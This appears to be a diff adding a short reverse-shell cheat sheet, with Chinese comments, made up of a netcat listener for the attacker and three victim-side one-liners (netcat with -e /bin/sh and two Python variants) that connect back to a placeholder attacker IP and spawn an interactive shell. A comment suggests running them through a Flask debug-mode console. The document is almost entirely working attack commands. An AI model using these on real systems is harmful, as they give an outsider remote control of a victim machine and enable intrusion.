@@ -1,0 +1,5 @@
+Attacker:nc -vvlp 12345
+Victim:
+nc -e /bin/sh 192.168.XX.1 12345 （Attacker的IP地址和端口号）
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.xx.1",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c "import os;os.system('nc -e /bin/sh 192.168.XX.1 12345')" #遇到过一个场景，Flask开启debug模式，在debug页面存在Python交互式shell，可以执行python代码
